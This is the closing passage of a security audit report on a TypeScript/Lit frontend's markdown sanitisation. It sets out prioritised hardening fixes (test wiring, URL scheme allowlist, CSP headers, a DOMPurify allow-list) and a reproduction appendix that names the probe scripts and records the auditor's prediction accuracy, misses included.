> validation in TypeScript, no sanitizer in Lit, no CSP behind it, and no rule in the
> guard that can see them (F2).

Merging round 9 is fine. Closing #195 on the strength of a green suite is not.

**To clear this verdict, in priority order:**

| # | fix | finding | effort |
|---|---|---|---|
| 1 | `npm test` on `Makefile:9` and `Makefile:16`, plus a CI workflow | F1 | ~20 lines |
| 2 | Scheme allowlist on `remote_url` / `PullRequest.url`, client and server; add the `href=${…}` rule to the guard | F2 | ~60 lines |
| 3 | CSP + `nosniff` + `Referrer-Policy` on the asset handler | F5 | ~15 lines |
| 4 | Invert `markdown.ts` to `ALLOWED_TAGS`/`ALLOWED_ATTR`, keep the deny-list as an assertion, add the vocabulary pin | F3 | ~20 lines |
| 5 | Extend `BANNED_SINKS` with fixtures | F4 | ~15 lines |

Items 1 and 3 together are about 35 lines and would do more for the production risk than
rounds 5 through 9 combined. That is not a criticism of the work in those rounds — it is
the point the brief asked me to make plainly, so I am making it plainly.

**Owner:** F1 and F5 belong to the repository/build maintainer, not to the developer on
#195. F2, F3 and F4 belong to this workstream. F7 belongs to the manager to route.

---

## Appendix — reproduction

Everything ran outside the tree; `git diff --quiet` clean at the end.

| script | what it measures |
|---|---|
| `/tmp/r9audit/predictions.md` | predictions written before any measurement |
| `/tmp/r9audit/probe-policy.mjs` | 35-payload hostile corpus through `renderMarkdown`; deny-list ablations against a scratch purifier |
| `/tmp/r9audit/probe-vocab.mjs` | markdown's real output vocabulary; corrected exec oracle |
| `/tmp/r9audit/probe-isolation.mjs` | DOMPurify instance isolation (singleton `setConfig`/`addHook`, second instance) |
| `/tmp/r9audit/probe-lit.mjs` | Lit attribute-binding sanitization |
| `/tmp/r9audit/mutate.py` | content-addressed mutation harness; M1–M4 |

Prediction accuracy: 4/4 on the mutation matrix (M1 GREEN, M3 GREEN, M2 RED, M4 GREEN);
on the policy corpus I predicted "0 exec survivors, ≥6 non-markdown tags" and measured
0 and 14. Two prediction misses worth recording: I predicted `target` would **survive**
DOMPurify's default attribute list — it is **stripped**, and the tree already pins that at
`markdown.test.ts:371-374`; and I predicted `<template>` would be stripped — it survives.
Neither changes a rating; both are places I was wrong before measuring.
